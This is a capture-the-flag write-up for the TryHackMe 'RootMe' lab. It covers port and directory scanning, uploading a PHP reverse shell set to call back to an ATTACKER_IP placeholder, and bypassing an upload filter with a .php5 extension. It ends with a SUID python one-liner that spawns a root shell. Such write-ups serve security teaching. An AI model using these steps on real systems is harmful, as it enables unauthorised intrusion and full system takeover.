# 🚩 RootMe - TryHackMe Writeup

## Objective

Gain initial access to the target machine, retrieve the user flag, escalate privileges, and obtain the root flag.

---

# Task 1 - Deploy the Machine

Deploy the target machine.

No answer required.

---

# Task 2 - Reconnaissance

## Question 1

### Scan the machine. How many ports are open?

I started with an Nmap scan:

```bash
nmap -sS -sV <TARGET_IP>
```

### Result

```text
22/tcp open ssh
80/tcp open http
```

### Answer

```text
2
```

---

## Question 2

### What version of Apache is running?

From the Nmap output:

```text
Apache/2.4.29
```

### Answer

```text
2.4.29
```

---

## Question 3

### What service is running on port 22?

The scan identified:

```text
ssh
```

### Answer

```text
ssh
```

---

## Question 4

### Find directories using Gobuster

I performed directory enumeration:

```bash
gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Result

```text
/uploads/
/panel/
```

---

## Question 5

### What is the hidden directory?

The interesting result was:

```text
/panel/
```

### Answer

```text
/panel/
```

---

# Task 3 - Getting a Shell

Visiting:

```text
http://<TARGET_IP>/panel/
```

revealed a file upload form.

---

## Uploading a Reverse Shell

I copied the PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Then edited:

```bash
nano php-reverse-shell.php
```

and replaced:

```php
$ip = 'ATTACKER_IP';
$port = 4444;
```

with my own listener IP and port.

---

## Bypassing File Restrictions

Direct PHP uploads were blocked.

To bypass the restriction, I renamed the file:

```bash
mv php-reverse-shell.php shell.php5
```

Then uploaded it successfully.

This upload bypass works because some servers execute alternative PHP extensions such as:

```text
.php5
.phtml
.phar
```

---

## Catching the Reverse Shell

Start a Netcat listener:

```bash
nc -lvnp 4444
```

Browse to:

```text
http://<TARGET_IP>/uploads/shell.php5
```

This triggered the reverse shell.

### Verify Access

```bash
whoami
```

Output:

```text
www-data
```

---

## User Flag

Locate the user flag:

```bash
find / -name user.txt 2>/dev/null
```

Read the flag:

```bash
cat /var/www/user.txt
```

### Answer

```text
[USER FLAG]
```

---

# Task 4 - Privilege Escalation

## Question 1

### Search for SUID files. Which file is unusual?

Enumerate SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Among the results:

```text
/usr/bin/python
```

stood out as unusual.

### Answer

```text
/usr/bin/python
```

---

## Privilege Escalation

I searched GTFOBins for Python SUID techniques.

Using the GTFOBins payload:

```bash
python -c 'import os; os.execl("/bin/sh","sh","-p")'
```

A root shell was spawned.

### Verify

```bash
whoami
```

Output:

```text
root
```

---

## Root Flag

Navigate to the root directory:

```bash
cd /root
ls
```

Read the flag:

```bash
cat root.txt
```

### Answer

```text
[ROOT FLAG]
```

---

# Commands Used

```bash
nmap -sC -sV <TARGET_IP>

gobuster dir -u http://<TARGET_IP> \
-w directory-list-2.3-medium.txt

nc -lvnp 4444

find / -name user.txt 2>/dev/null

find / -perm -4000 2>/dev/null

python -c 'import os; os.execl("/bin/sh","sh","-p")'
```

---

# Key Takeaways

* Always perform web directory enumeration.
* File upload functionality can often be abused to gain code execution.
* Alternative PHP extensions may bypass upload restrictions.
* Reverse shells provide interactive access to compromised systems.
* Misconfigured SUID binaries are a common privilege escalation vector.
* GTFOBins is extremely useful for Linux privilege escalation.

---

# Conclusion

RootMe is an excellent beginner-friendly room that combines reconnaissance, web exploitation, reverse shell access, and Linux privilege escalation. The challenge demonstrates how a vulnerable file upload mechanism can lead to full system compromise when combined with a misconfigured SUID binary.

